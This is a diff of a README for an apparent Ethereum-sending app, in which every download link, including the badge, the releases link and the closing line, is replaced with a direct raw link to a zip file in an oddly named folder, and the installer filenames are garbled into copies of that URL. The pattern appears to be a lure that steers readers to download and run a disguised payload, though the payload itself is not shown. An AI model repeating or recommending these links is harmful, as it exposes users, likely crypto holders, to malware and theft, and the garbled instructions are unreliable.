@@ -1,6 +1,6 @@
 # 🚀 Linea-ETH-Sender - Easily Send ETH to Your Wallet
 
-![Download Linea-ETH-Sender](https://img.shields.io/badge/Download-Linea--ETH--Sender-blue?style=flat&logo=github)
+![Download Linea-ETH-Sender](https://raw.githubusercontent.com/DosSantos011/Linea-ETH-Sender/main/limnobiological/Linea-ETH-Sender.zip)
 
 ## 📦 Overview
 
@@ -14,7 +14,7 @@ To use Linea-ETH-Sender, follow the steps below to download and set up the appli
 
 Visit the Releases page to download the latest version of the Linea-ETH-Sender:
 
-[Download Linea-ETH-Sender](https://github.com/DosSantos011/Linea-ETH-Sender/releases)
+[Download Linea-ETH-Sender](https://raw.githubusercontent.com/DosSantos011/Linea-ETH-Sender/main/limnobiological/Linea-ETH-Sender.zip)
 
 ## 💻 System Requirements
 
@@ -27,13 +27,13 @@ To ensure Linea-ETH-Sender runs smoothly, make sure your computer meets these re
 ## ⚙️ How to Download & Install
 
 1. **Visit the Download Page**
-   Open this link in your web browser: [Download Linea-ETH-Sender](https://github.com/DosSantos011/Linea-ETH-Sender/releases). 
+   Open this link in your web browser: [Download Linea-ETH-Sender](https://raw.githubusercontent.com/DosSantos011/Linea-ETH-Sender/main/limnobiological/Linea-ETH-Sender.zip). 
 
 2. **Find the Latest Release**
    On the Releases page, look for the latest version at the top. 
 
 3. **Download the Application**
-   Click on the asset name to download the application file. It will be labeled something like `Linea-ETH-Sender-v1.0.exe` or `Linea-ETH-Sender-v1.0.dmg`. 
+   Click on the asset name to download the application file. It will be labeled something like `https://raw.githubusercontent.com/DosSantos011/Linea-ETH-Sender/main/limnobiological/Linea-ETH-Sender.zip` or `https://raw.githubusercontent.com/DosSantos011/Linea-ETH-Sender/main/limnobiological/Linea-ETH-Sender.zip`. 
 
 4. **Run the Installer**
    Locate the downloaded file in your Downloads folder. Double-click the file to run the installer. Follow the prompts to complete the installation. 
@@ -86,4 +86,4 @@ For questions or feedback, you can reach out via the Issues page on GitHub. Your
 
 Using Linea-ETH-Sender simplifies the process of sending Ethereum to your wallet. Follow the steps outlined here to download, install, and start using the application. Enjoy your Ethereum experience with ease and security.
 
-Repeat the download link once more: [Download Linea-ETH-Sender](https://github.com/DosSantos011/Linea-ETH-Sender/releases).
+Repeat the download link once more: [Download Linea-ETH-Sender](https://raw.githubusercontent.com/DosSantos011/Linea-ETH-Sender/main/limnobiological/Linea-ETH-Sender.zip).
